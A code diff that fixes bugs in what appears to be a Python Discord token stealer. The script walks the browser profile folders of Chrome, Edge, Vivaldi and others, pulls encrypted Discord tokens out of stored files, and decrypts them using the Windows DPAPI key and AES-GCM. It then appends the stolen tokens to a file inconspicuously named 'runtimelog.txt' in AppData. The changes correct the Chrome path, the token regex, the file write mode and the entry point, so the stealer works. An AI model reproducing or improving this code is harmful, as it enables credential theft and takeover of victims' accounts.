@@ -39,7 +39,7 @@ def run():
         'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
         'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
         'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
-        'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
+        'Chrome': LOCAL + "\\Google\\Chrome\\User Data\\Default",
         'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
         'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
         'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
@@ -73,7 +73,7 @@ def run():
             try:
                 with open(f"{path}{file}", "r", errors="ignore") as f:
                     for line in (x.strip() for x in f.readlines()):
-                        for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
+                        for values in re.findall(r"dQw4w9WgXcQ:[^\"]+", line):
                             tokens.append(values)
             except PermissionError:
                 continue
@@ -102,8 +102,8 @@ def run():
             for token in gettokens(path):
                 token = token.replace("\\", "") if token.endswith("\\") else token
                 token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
-                with open(f'C:\\Users\\{user}\\AppData\LocalLow\\runtimelog.txt', 'w') as rnt:
+                with open(f'C:\\Users\\{user}\\AppData\LocalLow\\runtimelog.txt', 'a') as rnt:
                     rnt.write(token)
     if __name__ == "__main__":
-        main()
+        run()
 
